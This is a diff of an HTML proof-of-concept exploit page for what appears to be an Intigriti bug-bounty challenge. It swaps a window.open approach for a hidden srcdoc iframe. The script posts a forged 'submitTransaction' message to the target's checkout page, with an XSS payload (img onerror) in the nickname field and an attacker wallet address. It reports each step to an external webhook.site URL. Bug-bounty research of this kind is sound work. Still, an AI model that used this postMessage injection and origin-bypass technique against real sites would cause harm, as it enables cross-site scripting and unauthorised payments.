@@ -1,38 +1,56 @@
 <!DOCTYPE html>
-<html><head><title>Opener Exploit</title></head>
+<html><head><title>Srcdoc Exploit</title></head>
 <body>
-<h2>Opening checkout...</h2>
+<h2>Exploit</h2>
+<pre id=log></pre>
+<iframe id="x" style="display:none"></iframe>
 <script>
-const WEBHOOK = 'https://webhook.site/26f7bccf-5ff1-4eb7-94dd-bc44158aaff3';
+const WEBHOOK = 'https://webhook.site/f3aaf033-eed4-43c9-804b-9f0404dcded6';
 const WALLET = '16472226db03703a192aa383237035a69f';
+const log = document.getElementById('log');
 
-fetch(WEBHOOK + '?s=1_START').catch(()=>{});
+function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }
 
-// Open checkout in new window - keeps our window open
-const checkout = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
+report('1_START');
 
-fetch(WEBHOOK + '?s=2_OPENED').catch(()=>{});
-
-if (checkout) {
-    // Send postMessage to the opened window
-    setTimeout(function() {
-        fetch(WEBHOOK + '?s=3_SENDING').catch(()=>{});
+// Use srcdoc to create a same-origin iframe
+const iframe = document.getElementById('x');
+iframe.srcdoc = `
+    <!DOCTYPE html>
+    <body>
+    <script>
+        const parentOrigin = 'https://challenge-0126.intigriti.io';
+        const iframe = document.createElement('iframe');
+        iframe.src = parentOrigin + '/checkout.html?currency=1337COIN&price=1';
+        document.body.appendChild(iframe);
         
-        checkout.postMessage({
-            type: 'submitTransaction',
-            transaction: {
-                toAddress: WALLET,
-                currency: '1337COIN',
-                amount: 1,
-                nickname: '<img src=x onerror="alert(\'gigawatz\')">'
-            }
-        }, 'https://challenge-0126.intigriti.io');
-        
-        fetch(WEBHOOK + '?s=4_SENT').catch(()=>{});
-    }, 3000);
-} else {
-    fetch(WEBHOOK + '?s=2_BLOCKED').catch(()=>{});
-}
+        iframe.onload = function() {
+            parent.postMessage('IFRAME_LOADED', '*');
+            
+            setTimeout(function() {
+                iframe.contentWindow.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: '${WALLET}',
+                        currency: '1337COIN',
+                        amount: 1,
+                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
+                    }
+                }, parentOrigin);
+                
+                parent.postMessage('POSTMESSAGE_SENT', '*');
+            }, 2000);
+        };
+    </script>
+    </body>
+</html>
+`;
+
+report('2_SRCDOC_SET');
+
+window.addEventListener('message', function(e) {
+    report('MSG_' + e.data);
+});
 </script>
 </body>
 </html>
